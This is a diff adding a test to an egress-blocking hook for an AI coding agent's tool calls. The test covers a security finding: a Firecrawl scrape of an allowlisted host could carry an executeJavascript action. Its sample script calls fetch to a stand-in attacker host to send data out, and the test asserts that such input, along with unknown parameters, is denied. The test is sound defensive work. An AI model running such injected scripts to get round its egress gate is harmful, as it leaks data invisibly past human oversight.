@@ -184,6 +184,46 @@ describe('isEgressBlocked', () => {
     expect(isEgressBlocked('WebFetch', {})).toBe(false)
   })
 
+  it('an allowlisted scrape carrying a SECOND egress channel is denied (Cybersec HIGH)', () => {
+    // The finding: the gate judged `url` and nothing else, while the same input carries `actions`,
+    // whose types include `executeJavascript` with a free-text `script`. The package gates those
+    // behind SAFE_MODE = CLOUD_SERVICE === 'true', which we do not set. So a scrape of an APPROVED
+    // host could run arbitrary JS on the page and fetch() anywhere -- invisible in `url`, and
+    // invisible in the block log, which is what made it worse than an ungated tool.
+    const allowed = 'https://api.github.com/repos/x/y'
+    expect(
+      isEgressBlocked('mcp__firecrawl__firecrawl_scrape', {
+        url: allowed,
+        actions: [{ type: 'executeJavascript', script: 'fetch("https://attacker.invalid/?d=1")' }],
+      }),
+      'executeJavascript on an allowlisted host must not pass',
+    ).toBe(true)
+    // Positive control. Without it a rule that denies EVERY scrape would satisfy the case above.
+    expect(
+      isEgressBlocked('mcp__firecrawl__firecrawl_scrape', { url: allowed, formats: ['markdown'] }),
+      'an ordinary scrape of an allowlisted host must still work',
+    ).toBe(false)
+    // The point is fail-closed on UNKNOWN keys, not the name `actions`. A blacklist would pass this
+    // one and would pass whatever the next version of the package adds.
+    expect(
+      isEgressBlocked('mcp__firecrawl__firecrawl_scrape', { url: allowed, webhook: 'https://x/' }),
+      'an unrecognised parameter must deny, or the next schema addition re-opens the hole',
+    ).toBe(true)
+    // The transport/identity knobs that fall out of the same allowlist for free.
+    for (const extra of [{ skipTlsVerification: true }, { proxy: 'stealth' }, { profile: { name: 'p' } }]) {
+      expect(
+        isEgressBlocked('mcp__firecrawl__firecrawl_scrape', { url: allowed, ...extra }),
+        `${Object.keys(extra)[0]} must not pass`,
+      ).toBe(true)
+    }
+    // firecrawl_map is deliberately NOT param-gated: Cybersec read its schema (url, search, sitemap,
+    // includeSubdomains, limit, ignoreQueryParameters) and every field stays within the given host.
+    expect(
+      isEgressBlocked('mcp__firecrawl__firecrawl_map', { url: allowed, includeSubdomains: true }),
+      'map must keep working unchanged',
+    ).toBe(false)
+  })
+
   it('the hook is REGISTERED for the tools it now judges, not only for WebFetch', () => {
     // The half that nearly shipped broken. Widening isEgressBlocked() changed nothing while the
     // PreToolUse matcher still said `WebFetch`: Claude Code would not invoke the hook for
